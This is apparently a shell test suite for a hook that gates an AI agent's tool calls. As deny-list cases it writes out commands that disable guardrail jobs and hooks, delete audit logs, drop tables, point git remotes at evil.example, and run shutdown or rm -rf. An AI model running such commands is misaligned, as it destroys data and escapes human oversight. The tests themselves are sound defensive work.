t_assert "BUG-072 (k): via sql-deny path"               "ok"   "$(_via_sqldeny "${_r#*|}")"

_r=$(_b72 'turso db shell "$TURSO_DATABASE_URL" "TRUNCATE TABLE sessions"')
t_assert "BUG-072 (l): \$VAR db arg + TRUNCATE → deny"  "deny" "${_r%%|*}"
t_assert "BUG-072 (l): via sql-deny path"               "ok"   "$(_via_sqldeny "${_r#*|}")"

# DROP via a quoted db arg denied before this fix ONLY through the Track-4
# spec gate; the reason assertion is what makes this case meaningful.
_r=$(_b72 'turso db shell "libsql://x.turso.io" "DROP TABLE users"')
t_assert "BUG-072 (m): quoted db arg + DROP → deny"     "deny" "${_r%%|*}"
t_assert "BUG-072 (m): via sql-deny path, not spec gate" "ok"  "$(_via_sqldeny "${_r#*|}")"

# SQL in single quotes — only double quotes were stripped before.
_r=$(_b72 "turso db shell company-juvant 'TRUNCATE TABLE sessions'")
t_assert "BUG-072 (n): single-quoted SQL + TRUNCATE → deny" "deny" "${_r%%|*}"
t_assert "BUG-072 (n): via sql-deny path"                   "ok"  "$(_via_sqldeny "${_r#*|}")"

# Decoy `turso db shell` placed AFTER the verb: the greedy `.*` stripped the
# verb out of the payload entirely before any pattern ran.
_r=$(_b72 'turso db shell company-juvant "TRUNCATE TABLE sessions; SELECT '"'"'turso db shell zz'"'"'"')
t_assert "BUG-072 (o): decoy after TRUNCATE → deny"     "deny" "${_r%%|*}"
t_assert "BUG-072 (o): via sql-deny path"               "ok"   "$(_via_sqldeny "${_r#*|}")"

# …and it defeated even the position-independent escalation rule.
_r=$(_b72 'turso db shell company-juvant "UPDATE decisions SET scope='"'"'global'"'"' WHERE id=1; SELECT '"'"'turso db shell zz'"'"'"')
t_assert "BUG-072 (p): decoy after scope=global → deny" "deny" "${_r%%|*}"
t_assert "BUG-072 (p): via sql-deny path"               "ok"   "$(_via_sqldeny "${_r#*|}")"

# ── The BUG-066 exemption must survive intact ────────────────────────────
# Every one of these is a single turso invocation carrying prose or SQL that
# the universal deny-list would false-positive on. They must still ALLOW.
_b72a() { local _o; _o=$(_b72 "$1" "${2:-eng-platform}"); printf '%s' "${_o%%|*}"; }

t_assert "BUG-072 (q): prose shutdown, bare db → allow" "allow" \
  "$(_b72a 'turso db shell company-juvant "INSERT INTO decisions (rationale) VALUES ('"'"'the shutdown procedure'"'"')"')"
# New capability: with extraction fixed, the QUOTED db form gets the exemption
# it never actually had (pre-fix it fell through to the spec gate).
t_assert "BUG-072 (r): prose shutdown, quoted db → allow" "allow" \
  "$(_b72a 'turso db shell "libsql://x.turso.io" "INSERT INTO decisions (rationale) VALUES ('"'"'the shutdown procedure'"'"')"')"
t_assert "BUG-072 (s): prose git commit → allow" "allow" \
  "$(_b72a 'turso db shell company-juvant "INSERT INTO decisions (rationale) VALUES ('"'"'fix: git commit the upstream changes to main'"'"')"')"
t_assert "BUG-072 (t): prose TRUNCATE TABLE → allow" "allow" \
  "$(_b72a 'turso db shell company-juvant "INSERT INTO decisions (rationale) VALUES ('"'"'we TRUNCATE TABLE sessions in the nightly runbook'"'"')"')"
# A `;` INSIDE the quoted SQL is statement stacking, not a shell separator.
t_assert "BUG-072 (u): stacked SELECT inside quotes → allow" "allow" \
  "$(_b72a 'turso db shell company-juvant "SELECT 1; SELECT 2"')"
# A newline INSIDE the quoted SQL is data, not a separator.
t_assert "BUG-072 (v): newline inside quoted SQL → allow" "allow" \
  "$(_b72a 'turso db shell company-juvant "INSERT INTO decisions (rationale) VALUES ('"'"'line one
line two, the shutdown procedure'"'"')"')"
t_assert "BUG-072 (w): env-prefix + prose → allow" "allow" \
  "$(_b72a 'TURSO_DATABASE_URL=libsql://x.turso.io turso db shell company-juvant "INSERT INTO decisions (rationale) VALUES ('"'"'the shutdown procedure'"'"')"')"
t_assert "BUG-072 (x): absolute path to binary + prose → allow" "allow" \
  "$(_b72a '/opt/homebrew/bin/turso db shell company-juvant "INSERT INTO decisions (rationale) VALUES ('"'"'the shutdown procedure'"'"')"')"
# Bare interactive open: empty payload, must not abort the hook (BUG-066 guard).
t_assert "BUG-072 (y): bare interactive open → allow" "allow" \
  "$(_b72a 'turso db shell company-juvant')"

# ─────────────────────────────────────────────
# Summary
# ─────────────────────────────────────────────
# ─────────────────────────────────────────────
# Track 2f — guardrail-config tamper floor (FEAT-064)
# ─────────────────────────────────────────────
suite "Track 2f: guardrail tamper floor (FEAT-064)"

# Returns "yes" iff the decision is a deny attributed to Track 2f. $1 = value of
# JUVANT_FRAMEWORK_DEV (0 = enforce/adopter-sim, 1 = framework-dev exempt).
_t2f() {
  local out dec rsn
  out=$(echo "$2" | JUVANT_FRAMEWORK_DEV="$1" AGENT_ROLE=cso bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null || true)
  dec=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecision' 2>/dev/null)
  rsn=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason // ""' 2>/dev/null)
  if [[ "$dec" == "deny" && "$rsn" == *"Track 2f"* ]]; then echo "yes"; else echo "no"; fi
}

# Adopter (enforce): guardrail Write/Edit and Bash writes are denied by Track 2f.
t_assert "2f adopter: Write bash-policy.json → deny" "yes" \
  "$(_t2f 0 '{"tool_name":"Write","session_id":"s","tool_input":{"file_path":"hooks/bash-policy.json","content":"{}"}}')"
t_assert "2f adopter: Edit pre-tool-use.sh (abs path) → deny" "yes" \
  "$(_t2f 0 '{"tool_name":"Edit","session_id":"s","tool_input":{"file_path":"/x/hooks/pre-tool-use.sh","old_string":"a","new_string":"b"}}')"
t_assert "2f adopter: Write hooks/lib/db.sh → deny" "yes" \
  "$(_t2f 0 '{"tool_name":"Write","session_id":"s","tool_input":{"file_path":"hooks/lib/db.sh","content":"x"}}')"
t_assert "2f adopter: echo > bash-policy.json → deny" "yes" \
  "$(_t2f 0 '{"tool_name":"Bash","session_id":"s","tool_input":{"command":"echo x > hooks/bash-policy.json"}}')"
t_assert "2f adopter: tee hook → deny" "yes" \
  "$(_t2f 0 '{"tool_name":"Bash","session_id":"s","tool_input":{"command":"echo x | tee hooks/pre-tool-use.sh"}}')"
t_assert "2f adopter: sed -i hook → deny" "yes" \
  "$(_t2f 0 '{"tool_name":"Bash","session_id":"s","tool_input":{"command":"sed -i s/a/b/ hooks/bash-policy.json"}}')"

# Adopter: must NOT over-block — non-guardrail file, settings.json (Skill edits
# it; excluded), and a read-then-redirect-elsewhere are all free of Track 2f.
t_assert "2f adopter: Write non-guardrail file → not 2f" "no" \
  "$(_t2f 0 '{"tool_name":"Write","session_id":"s","tool_input":{"file_path":"docs/notes.md","content":"x"}}')"
t_assert "2f adopter: Write .claude/settings.json → not 2f (excluded)" "no" \
  "$(_t2f 0 '{"tool_name":"Write","session_id":"s","tool_input":{"file_path":".claude/settings.json","content":"{}"}}')"
t_assert "2f adopter: cat hook > /tmp (read, not write) → not 2f" "no" \
  "$(_t2f 0 '{"tool_name":"Bash","session_id":"s","tool_input":{"command":"cat hooks/pre-tool-use.sh > /tmp/x"}}')"

# decisions#300 item 9: tests/hooks/ is NOT a guardrail — instance-editable.
t_assert "2f adopter: Edit tests/hooks/x.sh → allow (not 2f)" "no" \
  "$(_t2f 0 '{"tool_name":"Edit","session_id":"s","tool_input":{"file_path":"tests/hooks/test-m365-legal-ip-policy.sh","old_string":"a","new_string":"b"}}')"
t_assert "2f adopter: Write /abs/tests/hooks/run-tests.sh → allow (not 2f)" "no" \
  "$(_t2f 0 '{"tool_name":"Write","session_id":"s","tool_input":{"file_path":"/repo/tests/hooks/run-tests.sh","content":"x"}}')"
t_assert "2f adopter: sed -i tests/hooks/x.sh → allow (not 2f)" "no" \
  "$(_t2f 0 '{"tool_name":"Bash","session_id":"s","tool_input":{"command":"sed -i s/a/b/ tests/hooks/test-m365-legal-ip-policy.sh"}}')"

# decisions#300 item 4 (security_audit_log#148b): git / file-op verbs, compound
# commands and interpreter writes. Operator role (empty) so the per-agent
# allow-list can't pre-empt the Track 2f verdict.
_t2fb() {
  local ev out rsn
  ev=$(jq -cn --arg c "$1" '{tool_name:"Bash",session_id:"s",tool_input:{command:$c}}')
  out=$(echo "$ev" | JUVANT_FRAMEWORK_DEV=0 AGENT_ROLE="" bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null || true)
  rsn=$(echo "$out" | jq -r '.hookSpecificOutput.permissionDecisionReason // ""' 2>/dev/null)
  if [[ "$rsn" == *"Track 2f"* ]]; then echo "yes"; else echo "no"; fi
}
# BUG-089 (juvant-os-pm#192): the scheduled guardrail jobs — plists, launchctl,
# crontab, uninstall, and the pinned checkout of main they run.
t_assert "2f BUG-089: Write a guardrail plist (abs path) → deny" "yes" \
  "$(_t2f 0 '{"tool_name":"Write","session_id":"s","tool_input":{"file_path":"/Users/x/Library/LaunchAgents/io.juvant.guardrails.drain-audit-spool.plist","content":"x"}}')"
t_assert "2f BUG-089: Edit a file in the pinned checkout → deny" "yes" \
  "$(_t2f 0 '{"tool_name":"Edit","session_id":"s","tool_input":{"file_path":".juvant/pinned-main/helpers/anomaly-check.sh","old_string":"a","new_string":"b"}}')"
t_assert "2f BUG-089: Write an unrelated LaunchAgents plist → not 2f" "no" \
  "$(_t2f 0 '{"tool_name":"Write","session_id":"s","tool_input":{"file_path":"/Users/x/Library/LaunchAgents/com.example.other.plist","content":"x"}}')"
for _c in \
  'cp /tmp/x.plist ~/Library/LaunchAgents/io.juvant.guardrails.anomaly-check.plist' \
  'plutil -replace ProgramArguments -json "[]" "$HOME/Library/LaunchAgents/io.juvant.guardrails.drain-audit-spool.plist"' \
  'rm ~/Library/LaunchAgents/io.juvant.*' \
  'sed -i "" s/a/b/ ~/Library/LaunchAgents/io.juvant.guardrails.cso-weekly-audit.plist' \
  'launchctl bootout gui/501/io.juvant.guardrails.drain-audit-spool' \
  'launchctl unload ~/Library/LaunchAgents/io.juvant.guardrails.anomaly-check.plist' \
  'launchctl disable gui/501/io.juvant.guardrails.cso-weekly-audit' \
  'launchctl kickstart -k gui/501/io.juvant.guardrails.audit-reconcile' \
  'launchctl bootout gui/501' \
  'launchctl bootout gui/501/com.example.other' \
  'L=io.juvant.x; launchctl remove "$L"' \
  'launchctl remove "$(launchctl list | awk "/guard/{print \$3}")"' \
  'T=gui/$UID/$J; /bin/launchctl kickstart -k "$T"' \
  'env -i launchctl unload "$P"' \
  'ls && xargs launchctl remove < labels.txt' \
  'sh -c "launchctl disable gui/501/x"' \
  'crontab /tmp/evil.cron' \
  'crontab -r' \
  'crontab -l | grep -v JUVANT | crontab -' \
  'bash helpers/install-schedules.sh --uninstall' \
  'echo x >> .juvant/pinned-main/helpers/drain-audit-spool.sh' \
  'chmod -R u+w .juvant/pinned-main'; do
  t_assert "2f BUG-089: Bash deny — $_c" "yes" "$(_t2fb "$_c")"
done
for _c in \
  'ls -l ~/Library/LaunchAgents/' \
  'cat ~/Library/LaunchAgents/io.juvant.guardrails.anomaly-check.plist' \
  'launchctl list' \
  'launchctl print gui/501/io.juvant.guardrails.drain-audit-spool' \
  'crontab -l' \
  'bash helpers/install-schedules.sh' \
  'launchctl print-disabled gui/501' \
  'launchctl list | grep juvant' \
  'launchctl blame gui/501/io.juvant.guardrails.anomaly-check' \
  'grep -n launchctl helpers/install-schedules.sh' \
  'git -C .juvant/pinned-main log -1'; do
  t_assert "2f BUG-089: Bash allow — $_c" "no" "$(_t2fb "$_c")"
done

for _c in \
  'git checkout HEAD~3 -- hooks/pre-tool-use.sh' \
  'git restore hooks/bash-policy.json' \
  'git rm hooks/lib/db.sh' \
  'git mv hooks/stop.sh hooks/stop.bak' \
  'git status && git checkout -- hooks/pre-tool-use.sh' \
  'ls; rm hooks/pre-tool-use.sh' \
  'cat x | cp /tmp/evil.sh hooks/pre-tool-use.sh' \
  'mv hooks/bash-policy.json /tmp/' \
  'rm -rf hooks/lib' \
  'find hooks -name "*.sh" -delete' \
  'cd hooks && rm pre-tool-use.sh' \
  'chmod -x hooks/pre-tool-use.sh' \
  'ln -sf /tmp/x hooks/pre-tool-use.sh' \
  'echo x >> "hooks/bash-policy.json"' \
  "python3 -c \"open('hooks/pre-tool-use.sh','w').write('')\"" \
  "node -e 'require(\"fs\").writeFileSync(\"hooks/lib/db.sh\",\"\")'" \
  'perl -pi -e "s/deny/allow/" hooks/pre-tool-use.sh' \
  "$(printf 'python3 - <<%s\nopen("hooks/bash-policy.json","w")\nPY' "'PY'")" \
  'bash -c "rm hooks/stop.sh"' \
  'echo $(rm hooks/stop.sh)' \
  ; do
  t_assert "2f adopter: deny — ${_c//$'\n'/ ⏎ }" "yes" "$(_t2fb "$_c")"
done
for _c in \
  'git diff HEAD upstream/main -- hooks/pre-tool-use.sh' \
  'git add hooks/pre-tool-use.sh && git commit -m "chore: sync hooks/pre-tool-use.sh"' \
  'git log --oneline -- hooks/' \
  'grep -n deny hooks/pre-tool-use.sh 2>&1 | head' \
  'shellcheck hooks/*.sh hooks/lib/*.sh' \
  "bash hooks/pre-tool-use.sh <<< '{}'" \
  'cp hooks/pre-tool-use.sh /tmp/backup.sh' \
  'cd hooks && ls' \
  'gh pr create --title "fix hooks/pre-tool-use.sh" --body "touches hooks"' \
  'bash tests/hooks/run-tests.sh' \
  ; do
  t_assert "2f adopter: allow (read) — $_c" "no" "$(_t2fb "$_c")"
done

# decisions#303 R1 + B2: the shared protected-path set (hooks/lib/
# guardrail-paths.sh) adds the audit spool family, .juvant/backups/,
# helpers/*.sh and scripts/*.sh.
for _p in .juvant/audit-spool.sql .juvant/audit-spool.sql.draining.123 .juvant/audit-spool.sql.merge.9 \
          .juvant/audit-spool.quarantine .juvant/backups/audit-spool.20261028.sql \
          helpers/drain-audit-spool.sh helpers/install-schedules.sh helpers/kb-sync.sh \
          scripts/governance-backfill.sh scripts/migrate.sh; do
  t_assert "2f adopter: Write $_p → deny" "yes" \
    "$(_t2f 0 "$(jq -cn --arg p "$_p" '{tool_name:"Write",session_id:"s",tool_input:{file_path:$p,content:"x"}}')")"
done
t_assert "2f adopter: Edit absolute path to the spool → deny" "yes" \
  "$(_t2f 0 "$(jq -cn --arg p "$ROOT_DIR/.juvant/audit-spool.sql" '{tool_name:"Edit",session_id:"s",tool_input:{file_path:$p,old_string:"a",new_string:"b"}}')")"
for _p in .juvant/config.json scripts/schema.sql tests/helpers/test-helpers-drain-backup.sh tests/sync/test-sync-compile.sh; do
  t_assert "2f adopter: Write $_p → not 2f" "no" \
    "$(_t2f 0 "$(jq -cn --arg p "$_p" '{tool_name:"Write",session_id:"s",tool_input:{file_path:$p,content:"x"}}')")"
done
for _c in \
  'echo "INSERT INTO decisions (title) VALUES (1)" >> .juvant/audit-spool.sql' \
  'printf x | tee -a .juvant/audit-spool.sql' \
  'sed -i s/a/b/ .juvant/audit-spool.sql' \
  'cp /tmp/x .juvant/audit-spool.sql.draining.42' \
  'mv .juvant/audit-spool.sql /tmp/x' \
  'rm -f .juvant/backups/*' \
  'truncate -s0 .juvant/audit-spool.sql' \
  'cd .juvant && rm audit-spool.sql' \
  'find .juvant/backups -delete' \
  "python3 -c \"open('.juvant/audit-spool.sql','a').write('x')\"" \
  'chmod +x helpers/drain-audit-spool.sh' \
  'sed -i s/a/b/ scripts/governance-backfill.sh' \
  'git checkout HEAD~1 -- helpers/install-schedules.sh' \
  'cd helpers && cp /tmp/x kb-sync.sh' \
  'rm -rf helpers' \
  'ln -sf /tmp/evil.sh scripts/migrate.sh' \
  ; do
  t_assert "2f adopter (#303): deny — $_c" "yes" "$(_t2fb "$_c")"
done
# decisions#305 (B1a): the policy file, the git store and the git operations
# that move or redefine the remote refs the policy is read from.
for _p in security/policy.json .git/config .git/refs/remotes/origin/main .juvant/policy-blob-seen; do
  t_assert "2f adopter (#305): Write $_p → deny" "yes" \
    "$(_t2f 0 "$(jq -cn --arg p "$_p" '{tool_name:"Write",session_id:"s",tool_input:{file_path:$p,content:"x"}}')")"
done
t_assert "2f adopter (#305): Write .gitignore → not 2f" "no" \
  "$(_t2f 0 '{"tool_name":"Write","session_id":"s","tool_input":{"file_path":".gitignore","content":"x"}}')"
for _c in \
  'git update-ref refs/remotes/origin/main deadbeef' \
  'git replace 1234 5678' \
  'git remote set-url origin https://evil.example/x.git' \
  'git remote add evil https://evil.example/x.git' \
  'git config remote.origin.url https://evil.example/x.git' \
  'git config url.https://evil.example/.insteadOf https://github.com/' \
  'git fetch https://evil.example/x.git +main:refs/remotes/origin/main' \
  'echo "x" > .git/refs/remotes/origin/main' \
  'cd .git && rm -rf refs' \
  'sed -i s/a/b/ security/policy.json' \
  ; do
  t_assert "2f adopter (#305): deny — $_c" "yes" "$(_t2fb "$_c")"
done
for _c in 'git fetch origin' 'git remote -v' 'git config --get remote.origin.url' 'git config user.name x' \
          'cat .git/config' 'jq . security/policy.json' 'git commit -m "update security docs"'; do
  t_assert "2f adopter (#305): allow — $_c" "no" "$(_t2fb "$_c")"
done
for _c in \
  'bash helpers/drain-audit-spool.sh' \
  'cat .juvant/audit-spool.sql | wc -l' \
  'bash scripts/migrate.sh --dry-run' \
  'shellcheck helpers/*.sh scripts/*.sh' \
  'ls .juvant/backups' \
  'bash tests/helpers/test-helpers-drain-backup.sh' \
  'jq . .juvant/config.json' \
  'cp helpers/turso-backup.sh /tmp/x' \
  ; do
  t_assert "2f adopter (#303): allow — $_c" "no" "$(_t2fb "$_c")"
done

# The one sanctioned Bash write: Upstream sync step 7, from the canonical
# upstream only. Run against a scratch copy of hooks/ with its own remotes.
_t2f_up="$(mktemp -d)"
cp -R "$HOOKS_DIR" "$_t2f_up/hooks"
git -C "$_t2f_up" init -q
git -C "$_t2f_up" remote add origin https://github.com/acme/instance.git
git -C "$_t2f_up" remote add upstream https://github.com/juvantlabs/juvant-os.git
_t2f_upc() {
  local ev rsn
  ev=$(jq -cn --arg c "$1" '{tool_name:"Bash",session_id:"s",tool_input:{command:$c}}')
  rsn=$(echo "$ev" | JUVANT_FRAMEWORK_DEV=0 AGENT_ROLE="" bash "$_t2f_up/hooks/pre-tool-use.sh" 2>/dev/null \
    | jq -r '.hookSpecificOutput.permissionDecisionReason // ""' 2>/dev/null || true)
  if [[ "$rsn" == *"Track 2f"* ]]; then echo yes; else echo no; fi
}
t_assert "2f sync: git checkout upstream/main -- hook (canonical upstream) → allow" "no" \
  "$(_t2f_upc 'git checkout upstream/main -- hooks/pre-tool-use.sh')"
t_assert "2f sync: git restore --source=upstream/main (canonical) → allow" "no" \
  "$(_t2f_upc 'git restore --source=upstream/main hooks/lib/db.sh')"
t_assert "2f sync: git checkout origin/main -- hook → deny" "yes" \
  "$(_t2f_upc 'git checkout origin/main -- hooks/pre-tool-use.sh')"
git -C "$_t2f_up" remote set-url upstream https://github.com/evil/juvant-os.git
t_assert "2f sync: upstream/main from a NON-canonical upstream → deny" "yes" \
  "$(_t2f_upc 'git checkout upstream/main -- hooks/pre-tool-use.sh')"
rm -rf "$_t2f_up"

# Framework-dev exempt (=1): guardrail edits are allowed.
t_assert "2f framework-dev: Write bash-policy.json → not 2f (exempt)" "no" \
  "$(_t2f 1 '{"tool_name":"Write","session_id":"s","tool_input":{"file_path":"hooks/bash-policy.json","content":"{}"}}')"
t_assert "2f framework-dev: echo > hook → not 2f (exempt)" "no" \
  "$(_t2f 1 '{"tool_name":"Bash","session_id":"s","tool_input":{"command":"echo x > hooks/pre-tool-use.sh"}}')"

# ─────────────────────────────────────────────
# Gate read precision (decisions#300 items 5 + 12, security_audit_log#150)
# ─────────────────────────────────────────────
suite "Gate read precision: SQL-write anchoring, quoted prose, shell keywords (decisions#300)"

_GP_CFG="$(mktemp)"
echo '{"turso_db_name":"company-x","projects":{"projx":{"turso_db_name":"project-x"}},"bootstrap_window":"0"}' > "$_GP_CFG"
# $1 = role, $2 = command → "allow" / "deny"
_gp() {
  jq -cn --arg c "$2" '{tool_name:"Bash",session_id:"s-gp",tool_input:{command:$c}}' \
    | JUVANT_CONFIG="$_GP_CFG" AGENT_ROLE="$1" bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null \
    | jq -r '.hookSpecificOutput.permissionDecision' 2>/dev/null || true
}

# Item 5 — read-only SQL from company scope against a project DB is a read.
t_assert "§4b: company SELECT replace(a,'b','c') on project DB → allow" "allow" \
  "$(_gp cso "turso db shell project-x \"SELECT replace(a,'b','c') FROM t\"")"
t_assert "§4b: same read inside a compound command → allow" "allow" \
  "$(_gp cso "turso db shell project-x \"SELECT replace(a,'b','c') FROM t\" && echo done")"
t_assert "§4b: write verb only inside a SQL string literal → allow" "allow" \
  "$(_gp cso "turso db shell project-x \"SELECT title FROM decisions WHERE rationale LIKE '%UPDATE%'\"")"
t_assert "§4c: project agent SELECT replace() on company DB → allow" "allow" \
  "$(_gp eng-lead "turso db shell company-x \"SELECT replace(title,'a','b') FROM decisions\"")"
# … while every real write is still denied.
t_assert "§4b: company INSERT on project DB → still deny" "deny" \
  "$(_gp cso "turso db shell project-x \"INSERT INTO decisions(title) VALUES ('x')\"")"
t_assert "§4b: company UPDATE on project DB → still deny" "deny" \
  "$(_gp cso "turso db shell project-x \"UPDATE decisions SET status='x' WHERE id=1\"")"
t_assert "§4b: write in a stacked statement → deny" "deny" \
  "$(_gp cso "turso db shell project-x \"SELECT 1; DELETE FROM t\"")"
t_assert "§4b: INSERT OR REPLACE behind a block comment → deny" "deny" \
  "$(_gp cso "turso db shell project-x \"/* c */ insert or replace into t values (1)\"")"
t_assert "§4b: REPLACE INTO → deny" "deny" \
  "$(_gp cso "turso db shell project-x \"REPLACE INTO t VALUES (1)\"")"
t_assert "§4b: CTE-led UPDATE → deny" "deny" \
  "$(_gp cso "turso db shell project-x \"WITH c AS (SELECT 1) UPDATE t SET a=1\"")"
t_assert "§4b: heredoc INSERT → deny" "deny" \
  "$(_gp cso "$(printf 'turso db shell project-x <<SQL\nINSERT INTO t VALUES (1);\nSQL')")"
t_assert "§4c: project agent INSERT on company DB → still deny" "deny" \
  "$(_gp eng-lead "turso db shell company-x \"INSERT INTO decisions(title) VALUES ('x')\"")"

# Item 12 — the pause keyword in quoted prose is data; a real command is not.
t_assert "universal: 'halt'/'reboot' inside a quoted rationale (compound cmd) → allow" "allow" \
  "$(_gp cso "turso db shell company-x \"INSERT INTO decisions (agent,title,category,rationale,status,scope) VALUES ('cso','t','security-remediation','company-wide; pause window: we halt the drain, then reboot','proposed','company')\" && echo ok")"
t_assert "universal: 'shutdown' in a quoted echo → allow" "allow" \
  "$(_gp cso 'git status && echo "note: the halt and shutdown procedure"')"
t_assert "Track 2d: 'git push' in quoted prose of a non-writer's SQL → allow" "allow" \
  "$(_gp cso "turso db shell company-x \"SELECT 1 WHERE 'we git push later' <> ''\" && echo ok")"
t_assert "universal: real shutdown → deny" "deny" "$(_gp cso 'shutdown -h now')"
t_assert "universal: shutdown after && → deny" "deny" "$(_gp cso 'echo hi && shutdown -h now')"
t_assert "universal: bash -c \"shutdown …\" (evaluated) → deny" "deny" "$(_gp cso 'bash -c "shutdown -h now"')"
t_assert "universal: quoted text piped to sh → deny" "deny" "$(_gp cso "echo 'shutdown -h now' | sh")"
t_assert "universal: \$(halt now) inside quotes → deny" "deny" "$(_gp cso 'echo "$(halt now)"')"
t_assert "universal: rm -rf \"/\" (single-word literal unwrapped) → deny" "deny" \
  "$(_gp cso 'rm -rf "/" --no-preserve-root')"
t_assert "universal: DROP TABLE in quoted SQL (compound) → still deny" "deny" \
  "$(_gp cso "turso db shell company-x \"DROP TABLE decisions\" && echo x")"

# Item 12 — shell keywords resolve to the command they introduce.
t_assert "allow-list: one-line for loop → resolves to the body binary (allow)" "allow" \
  "$(_gp cso 'for f in a b; do turso db shell company-x "SELECT 1"; done')"
t_assert "allow-list: multi-line for loop with 'do' line → allow" "allow" \
  "$(_gp cso "$(printf 'for f in a b\ndo\n  turso db shell company-x "SELECT 1"\ndone')")"
t_assert "allow-list: if/then → resolves to [[ (allow)" "allow" "$(_gp cso 'if [[ -f x ]]; then echo y; fi')"
t_assert "allow-list: for loop over a NON-allowed binary → still deny" "deny" \
  "$(_gp cso 'for f in a b; do curlzz x; done')"
# decisions#302 item 6: a control operator glued to the binary is not its name.
_gp_reason() {
  jq -cn --arg c "$2" '{tool_name:"Bash",session_id:"s-gp",tool_input:{command:$c}}' \
    | JUVANT_CONFIG="$_GP_CFG" AGENT_ROLE="$1" bash "$HOOKS_DIR/pre-tool-use.sh" 2>/dev/null \
    | jq -r '.hookSpecificOutput.permissionDecisionReason // ""' 2>/dev/null || true
}
t_assert "allow-list: 'curlzz; ls' names the binary 'curlzz', not 'curlzz;'" "yes" \
  "$(_r=$(_gp_reason cso 'curlzz; ls'); [[ "$_r" == "deny:allow-list:curlzz "* ]] && echo yes || echo "no: ${_r:0:40}")"
t_assert "allow-list: 'curlzz&& ls' / 'curlzz|ls' → binary 'curlzz'" "yes yes" \
  "$(for _c in 'curlzz&& ls' 'curlzz|ls'; do _r=$(_gp_reason cso "$_c"); [[ "$_r" == "deny:allow-list:curlzz "* ]] && printf 'yes ' || printf 'no '; done | sed 's/ $//')"

# ─────────────────────────────────────────────
# SQL content gate (decisions#303 E / E-bis / R5a)
# ─────────────────────────────────────────────
suite "SQL gate: prose literals, stdin/redirect SQL, audit immutability (decisions#303)"
_SQ_DIR="$(mktemp -d)"
printf 'DELETE FROM security_audit_log WHERE id=91;\n' > "$_SQ_DIR/del.sql"
printf 'SELECT id, severity FROM security_audit_log\nWHERE id BETWEEN 154 AND 164;\n' > "$_SQ_DIR/sel.sql"
printf "INSERT INTO messages (content) VALUES ('we will DROP TABLE x; and halt now');\n" > "$_SQ_DIR/prose.sql"
_SAL_INS="INSERT INTO security_audit_log (auditor,scope,audit_type,layer,finding,severity,category,status) VALUES"
# E — prose inside SQL literals is data; real statements are not.
t_assert "E: audit INSERT whose finding mentions DROP TABLE / TRUNCATE TABLE / halt → allow" "allow" \
  "$(_gp cso "turso db shell company-x \"$_SAL_INS ('cso','company','audit','agents','legal-ip: someone may DROP TABLE decisions; also TRUNCATE TABLE x; the pause window halt','high','finding','open')\"")"
t_assert "E: same prose INSERT inside a compound command → allow" "allow" \
  "$(_gp cso "turso db shell company-x \"$_SAL_INS ('cso','company','audit','agents','DROP TABLE prose','high','finding','open')\" && echo done")"
t_assert "E: real DROP TABLE → deny" "deny" "$(_gp cso 'turso db shell company-x "DROP TABLE decisions"')"
t_assert "E: stacked lowercase drop table → deny" "deny" "$(_gp cso 'turso db shell company-x "SELECT 1; drop table decisions"')"
t_assert "E: prose INSERT from a redirect file (';' and DROP inside the literal) → allow" "allow" \
  "$(_gp cso "turso db shell company-x < $_SQ_DIR/prose.sql")"
# E-bis — every input route is scanned or denied.
t_assert "E-bis: < file with DELETE on security_audit_log → deny" "deny" "$(_gp cso "turso db shell company-x < $_SQ_DIR/del.sql")"
t_assert "E-bis: < file with a SELECT → allow" "allow" "$(_gp cso "turso db shell company-x < $_SQ_DIR/sel.sql")"
t_assert "E-bis: < missing file → deny" "deny" "$(_gp cso 'turso db shell company-x < /nonexistent/x.sql')"
t_assert "E-bis: SQL piped in (cat f |) → deny" "deny" "$(_gp cso 'cat /tmp/x.sql | turso db shell company-x')"
t_assert "E-bis: SQL piped in (echo DELETE |) → deny" "deny" "$(_gp cso "echo 'DELETE FROM decisions' | turso db shell company-x")"
t_assert "E-bis: here-string DELETE → deny" "deny" "$(_gp cso "turso db shell company-x <<< 'DELETE FROM decisions WHERE id=1'")"
t_assert "E-bis: here-string SELECT → allow" "allow" "$(_gp cso "turso db shell company-x <<< 'SELECT 1'")"
t_assert "E-bis: here-string from a variable → deny" "deny" "$(_gp cso 'turso db shell company-x <<< "$SQL"')"
t_assert "E-bis: quoted heredoc DELETE → deny" "deny" \
  "$(_gp cso "$(printf "turso db shell company-x <<'SQL'\nDELETE FROM security_audit_log WHERE id=1;\nSQL")")"
t_assert "E-bis: quoted heredoc SELECT → allow" "allow" \
  "$(_gp cso "$(printf "turso db shell company-x <<'SQL'\nSELECT count(*) FROM security_audit_log;\nSQL")")"
t_assert "E-bis: unquoted heredoc with a live expansion → deny" "deny" \
  "$(_gp cso "$(printf 'turso db shell company-x <<SQL\nSELECT * FROM t WHERE id=$ID;\nSQL')")"
t_assert "E-bis: SQL argument that is a variable → deny" "deny" "$(_gp cso 'turso db shell company-x "$SQL"')"
t_assert "E-bis: SQL argument from \$(cat …) → deny" "deny" "$(_gp cso 'turso db shell company-x "$(cat /tmp/x.sql)"')"
t_assert "E-bis: DB URL from a variable + literal SQL → allow" "allow" "$(_gp cso 'turso db shell "$TURSO_DATABASE_URL" "SELECT 1"')"
t_assert "E-bis: process substitution <(…) → deny" "deny" "$(_gp cso "turso db shell company-x < <(echo 'DELETE FROM decisions')")"
t_assert "E-bis: .read dot-command → deny" "deny" "$(_gp cso 'turso db shell company-x ".read /tmp/x.sql"')"
t_assert "E-bis: .dump → allow" "allow" "$(_gp cso 'turso db shell company-x .dump')"
t_assert "E-bis: direct libsql HTTP (/v2/pipeline) → deny" "deny" "$(_gp cso "curl -s -X POST https://x.turso.io/v2/pipeline -d '{}'")"
t_assert "E-bis: sqlite3 DELETE on decisions → deny" "deny" "$(_gp cso 'sqlite3 .juvant/state.db "DELETE FROM decisions"')"
t_assert "E-bis: sqlite3 SELECT → allow" "allow" "$(_gp cso 'sqlite3 .juvant/state.db "SELECT count(*) FROM decisions"')"
# R5a — audit immutability at the Bash level.
t_assert "R5a: DELETE FROM security_audit_log → deny" "deny" "$(_gp cso 'turso db shell company-x "DELETE FROM security_audit_log WHERE id=91"')"
t_assert "R5a: lowercase delete from agent_actions_log → deny" "deny" "$(_gp cso 'turso db shell company-x "delete from agent_actions_log"')"
